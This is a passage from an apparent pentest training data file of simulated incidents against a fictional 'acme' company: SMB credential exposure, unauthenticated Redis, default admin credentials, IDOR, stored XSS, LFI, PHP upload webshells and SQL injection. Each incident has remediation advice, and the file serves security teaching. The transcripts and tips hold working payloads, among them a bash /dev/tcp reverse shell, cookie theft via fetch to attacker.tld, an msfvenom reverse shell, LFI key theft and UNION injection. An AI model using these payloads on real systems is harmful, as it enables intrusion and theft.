getting file db.bak.txt of size 412 as db.bak.txt
$ grep -i 'pass\\|sa=' db.bak.txt
# backup config -- generated 2026-04-02
sa=ACMESQLAdmin
password=Sp4rkles!Spring24
target=mssql01.acme.local:1433`,
    affected: [
      { kind: "Host", name: "fs01.acme.local (10.10.10.5)", detail: "SMB share 'backups' = Everyone:Read", action: "Restrict to backup-svc group; rotate share ACL.", severity: "high" },
      { kind: "Account", name: "MSSQL sa", detail: "Password 'Sp4rkles!Spring24' exfiltrated", action: "Rotate immediately; audit recent sa logins.", severity: "critical" },
      { kind: "Service", name: "mssql01.acme.local:1433", detail: "sa login now attacker-controlled", action: "Block sa from network logon; enable Windows-auth-only.", severity: "critical" },
    ],
    aligned_tools: ["smbclient", "enum4linux", "nmap", "hydra", "report-template"],
    data_sources: ["smb-shares", "nmap-scan", "loot-dir"],
    logs_sample: `[nmap] 445/tcp open  microsoft-ds  Samba smbd 4.6.2
[enum4linux] | OS:[Windows Server 2019 Datacenter]
[enum4linux] |  user:[guest] rid:[0x1f5] anonymous OK
[smbclient] get db.bak.txt -- 412 bytes`,
    metrics_sample: `smb_shares_enumerated                 4
shares_readable_anon                  1  <-- 'backups'
files_with_clear_text_creds           1
credentials_extracted                 1 (MSSQL sa)`,
    response_actions: ["Rotate sa password", "Restrict share ACL", "Audit other shares", "Hunt for sa logons"],
    next_steps: [
      { level: "L1", text: "Document creds + share path; do not log into MSSQL until pivot phase is greenlit." },
      { level: "L2", text: "Notify client; recommend immediate sa rotation." },
      { level: "L3", text: "Roll out crackmapexec spider_plus across the /24 to find every readable share with creds." },
    ],
    lab_slug: "pen200-smb-enum",
    concept: concept({
      concept: "Anonymous SMB Enumeration & Share Hygiene",
      definition: "SMB / CIFS shares accessible without authentication (guest / null session) — a common misconfiguration that exposes internal files.",
      why_it_exists: "Default Windows behaviour up to 2008 allowed null sessions. Even modern hosts often have 'backup' shares marked Everyone:Read for convenience.",
      blue_team_view: "Disable guest auth (RequireSecuritySignature, RestrictNullSessAccess); audit every share quarterly; baseline NetCease / BloodHound.",
      beginner: "Run `smbclient -L //target -N` — if you see shares, try `smbclient //target/sharename -N` and `ls`.",
      engineer: "Pipeline: nmap → enum4linux-ng → crackmapexec smb --shares → spider_plus → grep for 'pass=', 'connectionString', 'apikey'.",
      active_stage_id: "recon",
      tool_keys: ["smbclient", "nmap", "hydra"],
      learn_more: [
        { question: "Why is anonymous SMB still common in 2026?", answer: "Legacy backup jobs, NAS appliances with default configs, lift-and-shift to cloud without ACL re-review." },
        { question: "What files do pentesters grep for?", answer: "*.bak, *.kdbx, web.config, .env, sysprep.inf, unattend.xml, *.ps1 (often hardcoded creds)." },
        { question: "How do defenders detect this enumeration?", answer: "Multiple anonymous SMB session-setup attempts from one host in a short window — easy to alert in Windows Event ID 4625." },
      ],
    }),
  },

  {
    id: "PEN-INC-3003",
    title: "Internet-facing Redis without auth — full read/write to in-memory store",
    severity: "critical", status: "open", owner: "external-pentester",
    engagement: "ACME-2026-Q2", target_scope: "*.acme.com", target: "cache-edge-3.acme.com:6379",
    module: "PEN-M3", module_title: "M3 · Information Gathering",
    detected_at: iso(50), last_event_at: iso(5),
    kill_chain: "Recon → Exploit", current_phase: "exploit", reached_phases: ["recon", "exploit"],
    briefing: {
      who: "External recon operator, kali-cloud-01.",
      what: "nmap surfaced 6379/tcp open; `redis-cli INFO` succeeded without auth, exposing session tokens for 4,200 active users.",
      where: "cache-edge-3.acme.com (203.0.113.42), port 6379.",
      when: `${iso(50)} — discovered 50m ago, INFO output captured 5m ago.`,
      why: "Redis bound to 0.0.0.0:6379 with `requirepass` commented out; security group allows 0.0.0.0/0.",
      how: "masscan -p6379 → redis-cli -h target INFO → KEYS session:* → GET session:<id>.",
      severity_rationale: "CRITICAL — attacker can hijack any active user session, write SSH keys via CONFIG SET dir + dbfilename (Redis RCE).",
    },
    description: "A Redis instance is exposed to the internet with no authentication. Session tokens for thousands of users are readable, and CONFIG SET allows writing arbitrary files on the host.",
    original_event: `$ nmap -sV -p6379 203.0.113.42
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.2.7

$ redis-cli -h 203.0.113.42 INFO server
# Server
redis_version:6.2.7
os:Linux 5.15.0-89-generic x86_64
process_id:1842
uptime_in_days:412

$ redis-cli -h 203.0.113.42 KEYS 'session:*' | head -3
session:b1f4a... session:9c2e1... session:d4a3b...

$ redis-cli -h 203.0.113.42 GET session:b1f4a...
{"user_id":4112,"role":"admin","csrf":"...","exp":1746991821}`,
    affected: [
      { kind: "Host", name: "cache-edge-3.acme.com", detail: "Redis 6.2.7 on 0.0.0.0:6379, no auth", action: "Bind to 127.0.0.1; set requirepass; restrict SG.", severity: "critical" },
      { kind: "Database", name: "Redis db 0", detail: "4,200 session keys readable", action: "Rotate all session secrets; force re-auth.", severity: "critical" },
      { kind: "Account", name: "user_id=4112 (admin)", detail: "Active admin session in cache", action: "Invalidate; alert user.", severity: "high" },
    ],
    aligned_tools: ["nmap", "curl", "kali-shell", "report-template"],
    data_sources: ["nmap", "redis-cli", "shodan"],
    logs_sample: `[shodan] 203.0.113.42 6379/redis 'requirepass: -' product:Redis
[nmap] 6379/tcp open  redis   Redis 6.2.7
[redis-cli] INFO server -> auth=disabled
[redis-cli] DBSIZE -> 18,422 keys`,
    metrics_sample: `internet_exposed_services             14
services_without_auth                  3
redis_keys                        18,422
admin_sessions_in_cache               14
data_classification                CONFIDENTIAL`,
    response_actions: ["Notify client now", "Capture INFO + DBSIZE PoC", "Recommend rotation", "Block 6379 at edge"],
    next_steps: [
      { level: "L1", text: "Capture non-destructive PoC (INFO + key count + 1 anonymised session)." },
      { level: "L2", text: "Notify client immediately; recommend bind 127.0.0.1 + requirepass + SG restriction." },
      { level: "L3", text: "Recommend Redis ACLs (>= 6.0) and TLS for all cache nodes." },
    ],
    lab_slug: "pen200-nmap-version-scan",
    concept: concept({
      concept: "Unauthenticated Internet-Exposed Services",
      definition: "Database/cache/queue services bound to public interfaces without authentication or network restriction.",
      why_it_exists: "Default Redis/Mongo/ElasticSearch ship with no auth. Lift-and-shift to cloud often misses the security-group lockdown.",
      blue_team_view: "Continuous external attack-surface monitoring (Shodan, Censys, Project Discovery). Egress + ingress audit on every new deployment.",
      beginner: "If nmap shows 6379, 27017, 9200 open from the internet, try connecting with no password. If you get a prompt, you're in.",
      engineer: "Pivot from read to RCE: Redis CONFIG SET dir / dbfilename → SAVE writes a webshell or SSH key; Mongo restore writes arbitrary collections.",
      active_stage_id: "exploit",
      tool_keys: ["nmap", "curl", "report-template"],
      learn_more: [
        { question: "How does Redis-to-RCE actually work?", answer: "CONFIG SET dir /var/spool/cron/; CONFIG SET dbfilename root; SET x \"\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\"; SAVE." },
        { question: "What's the equivalent for Mongo/Elastic?", answer: "Mongo: read all collections, dump users. Elastic: query .kibana for stored creds; CVE-2014-3120 dynamic scripting for RCE on old versions." },
        { question: "How do you find these externally?", answer: "Shodan facet=product:Redis country:XX; Censys services.port=6379 and not services.banner: 'NOAUTH'." },
      ],
    }),
  },

  // ============== Module 5 ===============
  {
    id: "PEN-INC-5001",
    title: "Hidden admin panel discovered — default credentials accepted",
    severity: "critical", status: "in_progress", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "shop.acme.com", target: "https://shop.acme.com/admin-legacy/",
    module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    detected_at: iso(28), last_event_at: iso(6),
    kill_chain: "Recon → Exploit", current_phase: "exploit", reached_phases: ["recon", "exploit"],
    briefing: {
      who: "Web pentester running gobuster on shop.acme.com.",
      what: "Gobuster discovered /admin-legacy/ (HTTP 200); login form accepted admin / Password123 (default creds).",
      where: "Production e-commerce frontend.",
      when: `${iso(28)} — gobuster hit 28m ago; cred spray succeeded 6m ago.`,
      why: "Legacy admin UI from 2018 was never decommissioned; default account never rotated.",
      how: "gobuster dir → /admin-legacy/ 200 → form analysis in Burp → hydra http-post-form with seclists top10.txt.",
      severity_rationale: "CRITICAL — admin role can edit catalogue, view orders (PII), reset user passwords. Full e-commerce takeover.",
    },
    description: "A legacy admin panel was discovered via directory brute-forcing. It still accepts the vendor-default admin / Password123 credentials, granting full back-office access to the production shop.",
    original_event: `$ gobuster dir -u https://shop.acme.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
/admin                 (Status: 302) [Size: 0]
/admin-legacy          (Status: 200) [Size: 4128]
/api                   (Status: 401)
/cart                  (Status: 200)

$ curl -s https://shop.acme.com/admin-legacy/ | grep -i title
<title>ShopAdmin Classic — sign in</title>

$ hydra -l admin -P seclists/Passwords/top10.txt shop.acme.com https-post-form \\
       '/admin-legacy/login:user=^USER^&pass=^PASS^:F=Invalid'
[443][http-post-form] host: shop.acme.com login: admin password: Password123`,
    affected: [
      { kind: "URL", name: "https://shop.acme.com/admin-legacy/", detail: "Legacy admin UI exposed", action: "Take offline or block at WAF.", severity: "critical" },
      { kind: "Account", name: "admin / Password123", detail: "Default vendor credentials accepted", action: "Rotate and audit historical logins.", severity: "critical" },
      { kind: "Endpoint", name: "/admin-legacy/orders", detail: "PII for 18,422 customers readable", action: "Trigger DPO notification.", severity: "high" },
    ],
    aligned_tools: ["gobuster", "ffuf", "hydra", "curl", "burp", "report-template"],
    data_sources: ["dirb-wordlist", "burp-proxy", "hydra"],
    logs_sample: `[gobuster] /admin-legacy (Status: 200) [Size: 4128]
[hydra] [443][http-post-form] login: admin password: Password123
[app-log] LOGIN_OK user=admin ip=198.51.100.42 ua='Mozilla/5.0 (curl)'`,
    metrics_sample: `dirs_brute_forced                    4,612
hidden_endpoints_found                  3
default_creds_accepted                  1
orders_exfiltratable                18,422
PII_records_at_risk                 18,422`,
    response_actions: ["Capture screenshot evidence", "Notify client now", "Take legacy UI offline", "Trigger DPO process"],
    next_steps: [
      { level: "L1", text: "Capture login success screenshot + 1 sanitised order page (PII redacted)." },
      { level: "L2", text: "Notify client engagement lead immediately — PII exposure timeline matters." },
      { level: "L3", text: "Recommend WAF rule blocking /admin-legacy + remove the route in code." },
    ],
    lab_slug: "pen200-gobuster-dirs",
    concept: concept({
      concept: "Content Discovery & Default Credentials",
      definition: "Discovery of hidden web paths through wordlist brute-forcing, followed by attempting vendor-default credentials.",
      why_it_exists: "Apps accumulate legacy routes that don't appear in the visible nav. Defaults are rarely rotated because they 'feel internal'.",
      blue_team_view: "WAF rules to block legacy paths; periodic credential audit; remove old routes from code, not just from nav.",
      beginner: "Use a wordlist of common path names against the site; look for HTTP 200 / 301 on paths the site doesn't link to.",
      engineer: "Combine -x ext for php/asp/jsp/aspx, -k for TLS, recurse on found dirs; cross-reference results with Wayback Machine URLs.",
      active_stage_id: "recon",
      tool_keys: ["gobuster", "hydra", "burp", "curl"],
      learn_more: [
        { question: "Best wordlists in 2026?", answer: "SecLists raft-large-words, dirb common.txt, assetnote wordlists, custom per-tech (wordpress, drupal)." },
        { question: "How do you find default credentials?", answer: "Vendor docs, default-credentials.com, GitHub README files, Shodan banners with version → search vendor advisories." },
        { question: "What makes a path 'hidden'?", answer: "Not linked from any visible page, often left over from older versions or admin-only flows; still served by the framework router." },
      ],
    }),
  },

  {
    id: "PEN-INC-5002",
    title: "IDOR on /api/users/:id — any authenticated user reads any profile",
    severity: "high", status: "in_progress", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "api.acme.com", target: "https://api.acme.com/v2/users/{id}",
    module: "PEN-M5", module_title: "M5 · Intro to Web Applications",
    detected_at: iso(40), last_event_at: iso(8),
    kill_chain: "Recon → Action", current_phase: "action", reached_phases: ["recon", "exploit", "action"],
    briefing: {
      who: "Web pentester with low-priv account 'oscp@acme.com'.",
      what: "GET /v2/users/{id} returns full profile (incl. SSN-equivalent) for ANY id, not just the caller's.",
      where: "REST API behind the customer portal.",
      when: `${iso(40)} — fuzz started 40m ago; sequential ID enum proves IDOR.`,
      why: "Authorisation check missing on the read endpoint — backend trusts the URL parameter, not the JWT subject.",
      how: "ffuf -u /v2/users/FUZZ -w nums.txt -mc 200 → 4,200 200 responses → diff bodies to confirm distinct profiles.",
      severity_rationale: "HIGH — mass PII exfil possible. Not 'critical' only because writes still require admin token.",
    },
    description: "The user profile endpoint accepts any numeric id and returns the full profile without checking ownership. Mass enumeration extracts the entire customer database.",
    original_event: `# Authenticated as oscp@acme.com (user id 9418)
$ curl -s -H "Authorization: Bearer $TOK" https://api.acme.com/v2/users/9418 | jq .email
"oscp@acme.com"

# IDOR — read someone else's profile
$ curl -s -H "Authorization: Bearer $TOK" https://api.acme.com/v2/users/1 | jq .email
"founder@acme.com"

# Mass enumeration
$ ffuf -u https://api.acme.com/v2/users/FUZZ -w /usr/share/seclists/Fuzzing/4-digit-1000.txt \\
       -H "Authorization: Bearer $TOK" -mc 200 -s | wc -l
4200`,
    affected: [
      { kind: "Endpoint", name: "GET /v2/users/:id", detail: "No ownership check", action: "Compare URL :id to JWT sub; 403 on mismatch (unless admin).", severity: "high" },
      { kind: "Database", name: "users table", detail: "4,200 profiles readable", action: "Audit access logs; notify DPO if PII confirmed.", severity: "high" },
    ],
    aligned_tools: ["ffuf", "curl", "burp", "report-template"],
    data_sources: ["api-gateway-logs", "burp-history"],
    logs_sample: `[api-gw] 200 GET /v2/users/1 user=9418 (oscp@acme.com)
[api-gw] 200 GET /v2/users/2 user=9418 ...
[api-gw] 200 GET /v2/users/9999 user=9418
[note] 4,200 distinct id values returned 200 in 6 minutes`,
    metrics_sample: `api_endpoints_total                     412
endpoints_with_ownership_check           74%
endpoints_failing_idor_test               9
PII_records_readable_via_idor         4,200`,
    response_actions: ["Stop enumeration", "Document worst case (PII record)", "Recommend fix", "Add IDOR to OWASP retest plan"],
    next_steps: [
      { level: "L1", text: "Stop at 5 sample IDs; do NOT dump the full table." },
      { level: "L2", text: "PoC must show: own id 200, other id 200, JWT sub != URL :id." },
      { level: "L3", text: "Recommend: middleware comparing JWT.sub to req.params.id; integration test for every :id route." },
    ],
    lab_slug: "pen200-burp-intercept",
    concept: concept({
      concept: "Insecure Direct Object Reference (IDOR)",
      definition: "Authorization flaw where a server-side check is missing: a user with a valid session can access resources owned by another user by manipulating an identifier in the URL, body, or header.",
      why_it_exists: "Developers focus on authentication ('is the user logged in?') but forget authorisation ('does this user own this object?'). Especially common in REST APIs.",
      blue_team_view: "API gateways should log :id vs subject mismatches; automated SAST rules for missing authorisation middleware.",
      beginner: "Look at any URL with a number or username in it. Change it. Did the server let you see someone else's data? That's IDOR.",
      engineer: "Use Burp Autorize: configure low-priv and admin sessions; replay every request with both; flag any 200 from the low-priv that should be 403.",
      active_stage_id: "exploit",
      tool_keys: ["ffuf", "burp", "curl"],
      learn_more: [
        { question: "Where does IDOR hide besides URL paths?", answer: "Form fields (user_id=), JWT claims that are trusted without re-check, GraphQL query variables, websocket messages." },
        { question: "Why is mass enumeration ethically risky?", answer: "Exfil quantity drives DPO notification thresholds; capture proof on 3–5 records, not 4,200." },
        { question: "How is IDOR usually fixed?", answer: "Middleware that compares req.user.id (from session/JWT) to the requested resource owner; admin role bypass via explicit allowlist." },
      ],
    }),
  },

  // ============== Module 6 ===============
  {
    id: "PEN-INC-6001",
    title: "Stored XSS in product review → admin session hijack",
    severity: "critical", status: "open", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "shop.acme.com", target: "https://shop.acme.com/product/4112",
    module: "PEN-M6", module_title: "M6 · Common Web Attacks",
    detected_at: iso(55), last_event_at: iso(7),
    kill_chain: "Weaponize → Deliver → Exploit → Action", current_phase: "action",
    reached_phases: ["recon", "weaponize", "deliver", "exploit", "action"],
    briefing: {
      who: "Web pentester using a low-priv shopper account.",
      what: "Posted a review with `<img src=x onerror=fetch('//attacker/?c='+document.cookie)>`; admin moderation panel fired the payload and exfil'd the session cookie.",
      where: "Product page /product/4112 → admin moderation queue.",
      when: `${iso(55)} — payload posted 55m ago; admin opened queue 7m ago.`,
      why: "Review body is HTML-escaped on the public product page but rendered raw in the admin moderation UI.",
      how: "Posted review → waited → received cookie hit on attacker listener → replayed cookie → admin session.",
      severity_rationale: "CRITICAL — leads directly to admin access and full e-commerce takeover (catalogue, orders, payouts).",
    },
    description: "Stored XSS in the review system fires inside the admin moderation panel. The admin's session cookie was exfiltrated, granting attacker full admin context.",
    original_event: `# Posted review
$ curl -b "session=oscp_low" -d 'review=<img src=x onerror=fetch("https://attacker.tld/?c="+document.cookie)>&product_id=4112' \\
       https://shop.acme.com/api/reviews
{"id":88412,"status":"pending"}

# Attacker listener captured (7m later)
[2026-05-29 06:21:08] GET /?c=session=A1B2C3D4E5F6...; admin_role=true
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/124 (ACME-Admin-UI/2.1)
  Referer: https://shop.acme.com/admin/reviews/queue

# Replayed cookie
$ curl -b "session=A1B2C3D4E5F6..." https://shop.acme.com/admin/dashboard | grep -i welcome
<h1>Welcome, Sarah (admin)</h1>`,
    affected: [
      { kind: "URL", name: "/admin/reviews/queue", detail: "Renders user input as raw HTML", action: "HTML-escape; Content-Security-Policy default-src 'self'.", severity: "critical" },
      { kind: "Account", name: "Sarah (admin)", detail: "Session cookie exfiltrated", action: "Invalidate session; force MFA reset.", severity: "critical" },
      { kind: "Endpoint", name: "POST /api/reviews", detail: "Accepts HTML body without sanitisation", action: "Server-side sanitiser (DOMPurify-server or bleach).", severity: "high" },
    ],
    aligned_tools: ["burp", "curl", "report-template"],
    data_sources: ["attacker-listener", "app-logs", "burp-history"],
    logs_sample: `[app] POST /api/reviews user=9418 status=pending body_len=128
[attacker-listener] GET /?c=session=A1B2... ua='ACME-Admin-UI'
[app] GET /admin/dashboard user=admin_sarah cookie_replay_ip=198.51.100.42`,
    metrics_sample: `reviews_with_html                       3
reviews_with_script_pattern             1
admin_session_cookies_exfiltrated       1
csp_header_present                  NO`,
    response_actions: ["Invalidate admin session", "Sanitise review render", "Add CSP header", "Audit other rich-text inputs"],
    next_steps: [
      { level: "L1", text: "Capture one cookie hit; do NOT replay beyond a single read-only request." },
      { level: "L2", text: "Notify client; rotate admin session secrets." },
      { level: "L3", text: "Recommend CSP default-src 'self' + sanitise all stored HTML." },
    ],
    lab_slug: "pen200-xss-reflected",
    concept: concept({
      concept: "Stored Cross-Site Scripting (XSS)",
      definition: "Vulnerability where attacker input is stored server-side and rendered as HTML/JS for other users — executing in their browser context.",
      why_it_exists: "Forgetting to escape output in one render path is enough — even if other paths are safe. Admin UIs are common offenders because devs trust 'internal' data.",
      blue_team_view: "WAF input filtering (signal, not control), CSP with no unsafe-inline, regular Burp Scanner runs.",
      beginner: "Find a place where you can submit text that someone else will see. Put `<script>alert(1)</script>`. If their browser pops the alert, that's stored XSS.",
      engineer: "Map every render path for stored input. Test with `<img src=x onerror=…>` (bypasses naive script-tag filters). Chain to cookie exfil or CSRF for full impact.",
      active_stage_id: "exploit",
      tool_keys: ["burp", "curl"],
      learn_more: [
        { question: "Why is admin XSS worse than reflected XSS?", answer: "Stored payload fires on every admin view; one click = persistent compromise. Reflected requires phishing the victim once." },
        { question: "Does HttpOnly cookie save you?", answer: "Stops document.cookie exfil but not full session hijack — attacker can issue authenticated requests via fetch() with credentials." },
        { question: "How does CSP help?", answer: "default-src 'self' blocks inline script + external loads; nonces / hashes for required inline scripts. Reduces XSS impact even if input filter fails." },
      ],
    }),
  },

  {
    id: "PEN-INC-6002",
    title: "Local File Inclusion → SSH private key read → shell on app server",
    severity: "critical", status: "in_progress", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "shop.acme.com", target: "https://shop.acme.com/view.php?file=",
    module: "PEN-M6", module_title: "M6 · Common Web Attacks",
    detected_at: iso(75), last_event_at: iso(10),
    kill_chain: "Recon → Exploit → Install → C2", current_phase: "c2",
    reached_phases: ["recon", "exploit", "install", "c2"],
    briefing: {
      who: "Web pentester following up a gobuster hit on /view.php.",
      what: "?file= parameter accepts `../../../../home/deploy/.ssh/id_rsa`; key has no passphrase; SSH login as deploy@shop-app-01 succeeded.",
      where: "Internal app server shop-app-01 (10.10.10.42).",
      when: `${iso(75)} — LFI found 75m ago; SSH foothold 10m ago.`,
      why: "view.php uses file_get_contents($_GET['file']) without sanitisation; deploy user's key was readable to www-data via misconfigured ACL.",
      how: "curl ?file=../../../../etc/passwd → confirm path traversal → ?file=…/id_rsa → save → chmod 600 → ssh -i.",
      severity_rationale: "CRITICAL — LFI → arbitrary file read → SSH foothold on production app server. Full RCE under deploy.",
    },
    description: "A classic LFI on view.php allowed reading the deploy user's SSH private key, which provided shell access to the production application server.",
    original_event: `$ curl -s 'https://shop.acme.com/view.php?file=../../../../etc/passwd' | head -3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
deploy:x:1001:1001::/home/deploy:/bin/bash

$ curl -s 'https://shop.acme.com/view.php?file=../../../../home/deploy/.ssh/id_rsa' > id_rsa
$ head -1 id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----

$ chmod 600 id_rsa
$ ssh -i id_rsa deploy@10.10.10.42
deploy@shop-app-01:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),27(sudo)
deploy@shop-app-01:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/systemctl restart shop`,
    affected: [
      { kind: "Endpoint", name: "GET /view.php?file=", detail: "Arbitrary file read via path traversal", action: "Whitelist allowed filenames; basename() server-side.", severity: "critical" },
      { kind: "Host", name: "shop-app-01 (10.10.10.42)", detail: "deploy@ shell obtained", action: "Rotate SSH keys; restrict key file perms.", severity: "critical" },
      { kind: "Account", name: "deploy", detail: "NOPASSWD sudo on systemctl restart shop", action: "Remove sudo entry; rotate.", severity: "high" },
    ],
    aligned_tools: ["curl", "burp", "ffuf", "kali-shell", "report-template"],
    data_sources: ["app-logs", "ssh-logs", "burp-history"],
    logs_sample: `[apache] 200 GET /view.php?file=../../../../etc/passwd ua='curl/8.4.0'
[apache] 200 GET /view.php?file=../../../../home/deploy/.ssh/id_rsa
[sshd] Accepted publickey for deploy from 198.51.100.42 port 51234`,
    metrics_sample: `traversal_payloads_blocked             0  <-- no WAF rule
sensitive_files_readable               7
ssh_keys_world_readable                1
post_ex_sudo_paths                     1`,
    response_actions: ["Save key & access timestamps", "Notify client", "Do not pivot internally", "Recommend WAF rule"],
    next_steps: [
      { level: "L1", text: "Capture id_rsa hash + first SSH login banner; do NOT pivot beyond shop-app-01." },
      { level: "L2", text: "Notify client; recommend immediate key rotation." },
      { level: "L3", text: "Patch view.php to use a whitelist; deploy WAF rule for ../ patterns." },
    ],
    lab_slug: "pen200-lfi-exploit",
    concept: concept({
      concept: "Local File Inclusion (LFI)",
      definition: "Server-side vulnerability where user input controls which file the server reads or includes, allowing arbitrary file access.",
      why_it_exists: "Functions like PHP include / file_get_contents / Java new File() trust path strings. Path-traversal sequences (../) escape the intended directory.",
      blue_team_view: "WAF rules for ../ and absolute paths; whitelisting on the server side; chroot the web user; strict POSIX permissions on key files.",
      beginner: "Find a URL with a filename in it. Try `?file=../../../etc/passwd`. If you see root:x:0:0:, it's LFI.",
      engineer: "Pivot LFI → RCE via /proc/self/environ, log poisoning (apache + User-Agent injection), PHP wrapper (php://filter base64 read of source, then write).",
      active_stage_id: "exploit",
      tool_keys: ["curl", "burp", "ffuf"],
      learn_more: [
        { question: "What files do pentesters always grab on LFI?", answer: "/etc/passwd, /etc/shadow (if root), id_rsa, .bash_history, web.config, /proc/net/tcp, /proc/self/environ." },
        { question: "How do you turn LFI into RCE?", answer: "Log poisoning (User-Agent → access.log → include), /proc/self/environ, session file include, PHP wrapper, SMB/UNC include on Windows." },
        { question: "What's the difference between LFI and RFI?", answer: "LFI reads local files. RFI fetches a remote URL — possible only if allow_url_include is on (rare in 2026)." },
      ],
    }),
  },

  {
    id: "PEN-INC-6003",
    title: "Unrestricted PHP file upload → webshell → reverse shell",
    severity: "critical", status: "open", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "shop.acme.com", target: "https://shop.acme.com/upload.php",
    module: "PEN-M6", module_title: "M6 · Common Web Attacks",
    detected_at: iso(90), last_event_at: iso(12),
    kill_chain: "Weaponize → Deliver → Install → C2", current_phase: "c2",
    reached_phases: ["recon", "weaponize", "deliver", "exploit", "install", "c2"],
    briefing: {
      who: "Web pentester on the customer-portal upload feature.",
      what: "Upload accepts .php; saved file is executable from /uploads/; reverse shell to attacker:4444 established as www-data.",
      where: "/uploads/shell.php on shop-app-01.",
      when: `${iso(90)} — upload accepted 90m ago; shell live 12m ago.`,
      why: "MIME check is client-side only; server saves the file under original extension; uploads dir served with PHP handler.",
      how: "Renamed shell.php from msfvenom (php/reverse_php) → upload via web form → curl /uploads/shell.php → nc listener catches shell.",
      severity_rationale: "CRITICAL — direct RCE as web user, foothold for privesc to deploy/root.",
    },
    description: "The upload form has no server-side extension check; a PHP reverse shell was uploaded and executed, granting attacker code execution as www-data on the production app host.",
    original_event: `$ msfvenom -p php/reverse_php LHOST=198.51.100.42 LPORT=4444 -o shell.php
[*] Payload size: 3025 bytes

$ curl -s -F 'avatar=@shell.php;filename=shell.php' -F 'token=$TOK' \\
       https://shop.acme.com/upload.php
{"saved":"/uploads/shell.php","mime":"application/octet-stream"}

# Trigger shell (separate terminal: nc -lvnp 4444)
$ curl -s https://shop.acme.com/uploads/shell.php >/dev/null &

# Listener
listening on [any] 4444 ...
connect from shop-app-01 [10.10.10.42] 41218
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
    affected: [
      { kind: "Endpoint", name: "POST /upload.php", detail: "No server-side extension/MIME check", action: "Whitelist extensions; rename uploads with UUID; strip script handlers from /uploads.", severity: "critical" },
      { kind: "Host", name: "shop-app-01 (10.10.10.42)", detail: "www-data shell live", action: "Kill PID; quarantine /uploads; rotate creds.", severity: "critical" },
      { kind: "URL", name: "/uploads/shell.php", detail: "Webshell artefact", action: "Delete after PoC capture.", severity: "high" },
    ],
    aligned_tools: ["curl", "msfvenom", "msfconsole", "burp", "kali-shell", "report-template"],
    data_sources: ["app-logs", "nc-listener", "burp-history"],
    logs_sample: `[apache] 200 POST /upload.php saved=/uploads/shell.php size=3025
[apache] 200 GET /uploads/shell.php ua='curl/8.4.0'
[shell] connect from 10.10.10.42 to attacker:4444`,
    metrics_sample: `upload_extensions_blocked             0  <-- whitelist missing
upload_dir_executes_scripts          YES
webshells_uploaded                     1
reverse_shells_active                  1`,
    response_actions: ["Capture shell ID + timestamp", "Delete webshell", "Notify client", "Recommend whitelist"],
    next_steps: [
      { level: "L1", text: "Capture nc banner + id output; delete shell.php immediately after PoC." },
      { level: "L2", text: "Notify client; recommend extension whitelist + script-handler strip on /uploads." },
      { level: "L3", text: "Recommend EDR on web hosts and weekly upload-dir audit." },
    ],
    lab_slug: "pen200-file-upload-shell",
    concept: concept({
      concept: "Unrestricted File Upload → RCE",
      definition: "Web upload endpoint that fails to validate file type, extension or storage location, allowing an attacker to upload code that the server then executes.",
      why_it_exists: "Devs check MIME client-side, trust the filename, or save files in a directory that the web server interprets (PHP/ASP handlers).",
      blue_team_view: "Server-side extension whitelist, rename on save (UUID), strip script handlers on upload dir, AV scan via ClamAV.",
      beginner: "Find an upload form. Upload shell.php. Visit /uploads/shell.php. If it runs PHP, you have RCE.",
      engineer: "Bypasses: double extension (shell.php.jpg), magic byte spoofing, .htaccess upload, .phtml/.phar variants, content-type tampering in Burp.",
      active_stage_id: "exploit",
      tool_keys: ["msfconsole", "burp", "curl"],
      learn_more: [
        { question: "Common bypasses for extension blacklists?", answer: ".phtml, .phar, .pht, .php5, .php7, .inc; double extension shell.jpg.php; uppercase .PHP; null byte (older PHP)." },
        { question: "What if the uploads dir doesn't execute PHP?", answer: "Upload .htaccess to enable; or pivot to LFI to include the uploaded file; or upload an SSRF/XXE payload (xml, svg)." },
        { question: "How does an attacker turn www-data into root?", answer: "Sudo misconfig (sudo -l), SUID binaries, kernel exploits, cron weakness, GTFOBins on a writable script." },
      ],
    }),
  },

  // ============== Module 7 ===============
  {
    id: "PEN-INC-7001",
    title: "UNION-based SQLi in /products?id= → full user table dump",
    severity: "critical", status: "in_progress", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "shop.acme.com", target: "https://shop.acme.com/products?id=",
    module: "PEN-M7", module_title: "M7 · SQL Injection",
    detected_at: iso(110), last_event_at: iso(15),
    kill_chain: "Recon → Exploit → Action", current_phase: "action",
    reached_phases: ["recon", "exploit", "action"],
    briefing: {
      who: "Web pentester running sqlmap with --batch on shop.acme.com.",
      what: "?id parameter is UNION-injectable on MySQL 5.7; dumped 4 rows from users table including admin bcrypt hash.",
      where: "Public product page on the production shop.",
      when: `${iso(110)} — sqlmap confirmed 110m ago; users dump 15m ago.`,
      why: "Backend builds query via string concat; ORM not used; no parameterised query.",
      how: "Manual test ?id=1' → error → ?id=1 ORDER BY 4-- - → ?id=-1 UNION SELECT 1,user,pass,4 FROM users-- -.",
      severity_rationale: "CRITICAL — full DB readable, including hashed admin creds. Crackable hash leads to admin takeover.",
    },
    description: "UNION-based SQL injection on the product listing endpoint allows reading any column from any table in the shop database. Admin bcrypt hash dumped.",
    original_event: `$ curl -s "https://shop.acme.com/products?id=1'" | grep -i 'mysql\\|sql'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version

$ curl -s "https://shop.acme.com/products?id=1 ORDER BY 4-- -" | wc -l  # 200 OK
$ curl -s "https://shop.acme.com/products?id=1 ORDER BY 5-- -" | wc -l  # 500 — so 4 cols

$ curl -s "https://shop.acme.com/products?id=-1 UNION SELECT 1,user,pass,4 FROM users-- -"
<div class="product">
